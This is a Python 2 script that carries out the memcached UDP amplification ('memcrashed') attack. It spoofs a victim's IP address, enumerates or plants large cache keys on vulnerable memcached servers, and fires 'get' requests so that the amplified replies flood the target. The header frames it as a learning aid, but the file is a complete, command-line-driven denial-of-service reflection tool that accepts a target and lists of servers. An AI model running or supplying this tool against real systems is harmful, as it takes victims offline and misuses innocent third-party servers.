"""
# Written by Alex Conrey
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.

# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.

# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
# This was created to better understand the memcrashed exploit
# brought to light thanks to CloudFlare.
# (https://blog.cloudflare.com/memcrashed-major-amplification-attacks-from-port-11211/)
#
# Please sysadmin responsibly.
"""

import re
import sys
import argparse
import requests
import memcache

from scapy.layers.inet import IP, UDP

from scapy.all import sr1

def work_magic(server, target):
    """Function to perform payload 'offload'
    from vulnerable memcached server"""

    # optional payload to set if no keys exist
    payload = requests.get('https://google.com').text
    payload_key = 'fuckit'

    try:
        ip_packet = IP(src=target, dst=server)
        packet_base = '\x00\x00\x00\x00\x00\x01\x00\x00{0}\r\n'

        # fetch known keys by id
        statitems_packet = packet_base.format('stats items')
        udp = UDP(sport=50000, dport=11211)/statitems_packet
        keyids = []
        resp = sr1(ip_packet/udp)
        for key in str(resp.payload).split('\r\n'):
            # Skip first line which has hex in it (I'm lazy)
            if 'age' in key:
                key = key.split(':')[1]
                keyids.append(key)

        # fetch names for keys by id
        keys = []
        for kid in keyids:
            keyid_packet = packet_base.format('stats cachedump {0} 100'.format(kid))
            udp = UDP(sport=50000, dport=11211)/keyid_packet
            resp = str(sr1(ip_packet/udp).payload).split('\r\n')
            for key in resp:
                if 'ITEM' in key:
                    res = re.match(r"(.*)ITEM (?P<keyname>\w+)(.*)", key)
                    keys.append(res.group('keyname'))

        # if keys not present on target, make one
        if not keys:
            memcache.Client([server], debug=False).set(payload_key, payload)
            keys.append(payload_key)

        # iterate thru known keys and blast away
        for key in keys:
            fun_packet = packet_base.format('get {0}'.format(key))
            udp = UDP(sport=50000, dport=11211)/fun_packet
            sr1(ip_packet/udp)

        return True
    except Exception as err:
        print str(err)
        return False


def main():
    """Main function"""
    parser = argparse.ArgumentParser()

    server_help = 'List of servers to utilize (space separated)'
    list_help = 'File path to list of servers (newline separated)'
    target_help = 'Target to test'

    parser.add_argument('-s', '--servers', nargs="+", help=server_help)
    parser.add_argument('-l', '--list', help=list_help)
    parser.add_argument('-t', '--target', required=True, help=target_help)
    args = parser.parse_args()

    if not args.servers and not args.list:
        print 'Please specify a list of servers or a file containing a list of servers'
        sys.exit(1)

    if args.servers and args.list:
        print 'Please only specify a file or cmd list of servers'
        sys.exit(1)

    if args.servers:
        server_list = args.servers

    if args.list:
        server_list = []
        with open(args.list, 'r') as list_in:
            for server in list_in:
                server_list.append(server.rstrip('\n'))

    try:
        for server in server_list:
            work_magic(server, args.target)
    except Exception as err:
        print str(err)
        sys.exit(1)

if __name__ == '__main__':
    main()
